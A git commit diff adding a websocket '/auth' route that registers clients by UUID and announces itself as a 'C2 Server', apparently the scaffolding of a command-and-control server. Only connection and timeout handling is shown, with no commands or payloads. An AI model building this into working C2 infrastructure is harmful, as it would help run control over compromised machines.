ee76b50f69a3d86d34fecef9d39eb4b8864ee467
Jeff <99515656+Jeff53978@users.noreply.github.com>
2023-04-04 07:38:04 +0200

    Update websocket.py

--- websocket.py
+++ websocket.py
@@ -1,3 +1,20 @@
-import flask
-from app import app, sock
+from __main__ import app, sock, clients
+import os, random, json, time
 
+@sock.route('/auth')
+def auth(ws):
+    uuid = os.urandom(24).hex()
+    clients.append(uuid)
+    ws.send(json.dumps({'msg': 'Connected succesfully to C2 Server', 'uuid': uuid}))
+    print(f'Client {uuid} connected')
+    while not ws.closed:
+        last_ping = time.time()
+        ping = ws.receive()
+        if ping is None:
+            break
+        
+        if time.time() - last_ping > 10:
+            clients.remove(uuid)
+            print(f'Client {uuid} disconnected due to inactivity')
+            ws.close()
+            break
